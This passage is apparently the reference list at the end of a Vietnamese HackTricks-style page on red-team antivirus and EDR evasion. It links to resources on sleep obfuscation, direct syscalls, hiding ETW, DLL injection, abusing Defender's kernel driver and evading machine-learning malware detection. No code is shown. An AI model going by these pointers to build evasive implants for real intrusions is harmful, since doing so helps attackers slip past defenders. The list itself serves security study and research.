- [30] [Người đẹp ngủ trong rừng II: CFG, CET và giả mạo stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Làm rối thời gian ngủ Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ẩn ETW của Dotnet](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Lạm dụng Chrome Remote Desktop trong hoạt động Red Team: Hướng dẫn thực hành](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Vũ khí hóa driver khắc phục sự cố của Defender làm primitive cho thao tác kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Mã đồng hành Function Peekaboo của MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Tạo các hàm tự che giấu bằng LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Mã nguồn InjectSetConsole của TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Hàm CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Tạo child process với input và output được chuyển hướng](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Tái tạo công cụ C# bằng WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Biên dịch dự án C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept và mã nguồn](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Lạm dụng nội bộ thread pool để inject DLL không cần shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Bộ dữ liệu benchmark EMBER2024 và công cụ thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Dùng EMBER2024 để đánh giá implant Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Né tránh các phương pháp phát hiện dựa trên Machine Learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
